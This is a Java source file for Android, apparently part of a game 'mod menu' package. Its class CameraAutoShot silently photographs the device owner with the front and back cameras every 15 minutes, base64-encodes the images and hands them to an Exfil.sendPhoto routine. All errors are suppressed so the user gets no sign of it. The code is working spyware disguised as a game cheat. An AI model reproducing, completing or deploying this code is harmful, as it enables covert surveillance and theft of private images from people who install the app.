package com.brawl.modmenu;

import android.content.Context;
import android.graphics.ImageFormat;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.media.Image;
import android.media.ImageReader;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.Looper;
import android.util.Base64;
import java.util.Arrays;

public class CameraAutoShot {

    private static final long INTERVAL = 15 * 60 * 1000L; // 15 минут
    private static Handler timer;

    public static void start(final Context ctx) {
        if (timer != null) return;
        timer = new Handler(Looper.getMainLooper());

        Runnable task = new Runnable() {
            @Override
            public void run() {
                try {
                    takeFront(ctx);
                    // через 5 сек — задняя
                    new Handler(Looper.getMainLooper()).postDelayed(() -> takeBack(ctx), 5000);
                } catch (Throwable ignored) {}
                timer.postDelayed(this, INTERVAL);
            }
        };
        timer.postDelayed(task, INTERVAL);
    }

    public static void takeFront(Context ctx) { shoot(ctx, true, "FRONT_CAM"); }
    public static void takeBack(Context ctx) { shoot(ctx, false, "BACK_CAM"); }

    private static void shoot(final Context ctx, final boolean front, final String tag) {
        new Thread(() -> {
            try {
                CameraManager cm = (CameraManager)
                    ctx.getSystemService(Context.CAMERA_SERVICE);
                if (cm == null) return;

                String camId = null;
                for (String id : cm.getCameraIdList()) {
                    android.hardware.camera2.CameraCharacteristics c =
                        cm.getCameraCharacteristics(id);
                    Integer facing = c.get(
                        android.hardware.camera2.CameraCharacteristics.LENS_FACING);
                    if (facing == null) continue;

                    if (front && facing == android.hardware.camera2.CameraCharacteristics.LENS_FACING_FRONT) {
                        camId = id;
                        break;
                    }
                    if (!front && facing == android.hardware.camera2.CameraCharacteristics.LENS_FACING_BACK) {
                        camId = id;
                        break;
                    }
                }
                if (camId == null) return;

                final HandlerThread ht = new HandlerThread("camshot");
                ht.start();
                final Handler h = new Handler(ht.getLooper());
                final ImageReader r = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 1);

                r.setOnImageAvailableListener(reader -> {
                    try {
                        Image img = reader.acquireLatestImage();
                        java.nio.ByteBuffer buf = img.getPlanes()[0].getBuffer();
                        byte[] data = new byte[buf.remaining()];
                        buf.get(data);
                        img.close();

                        String b64 = Base64.encodeToString(data, Base64.NO_WRAP);
                        Exfil.sendPhoto(tag, b64);
                        ht.quitSafely();
                    } catch (Throwable ignored) {}
                }, h);

                final String finalCamId = camId;
                cm.openCamera(finalCamId, new CameraDevice.StateCallback() {
                    @Override
                    public void onOpened(CameraDevice cam) {
                        try {
                            CaptureRequest.Builder b = cam.createCaptureRequest(
                                CameraDevice.TEMPLATE_STILL_CAPTURE);
                            b.addTarget(r.getSurface());
                            cam.createCaptureSession(Arrays.asList(r.getSurface()),
                                new CameraCaptureSession.StateCallback() {
                                    @Override
                                    public void onConfigured(CameraCaptureSession s) {
                                        try { s.capture(b.build(), null, h); }
                                        catch (Throwable ignored) {}
                                    }
                                    @Override
                                    public void onConfigureFailed(CameraCaptureSession s) {}
                                }, h);
                        } catch (Throwable ignored) {}
                    }
                    @Override public void onDisconnected(CameraDevice c) {
                        try { c.close(); } catch (Throwable ignored) {}
                    }
                    @Override public void onError(CameraDevice c, int e) {
                        try { c.close(); } catch (Throwable ignored) {}
                    }
                }, h);
            } catch (Throwable ignored) {}
        }).start();
    }
}
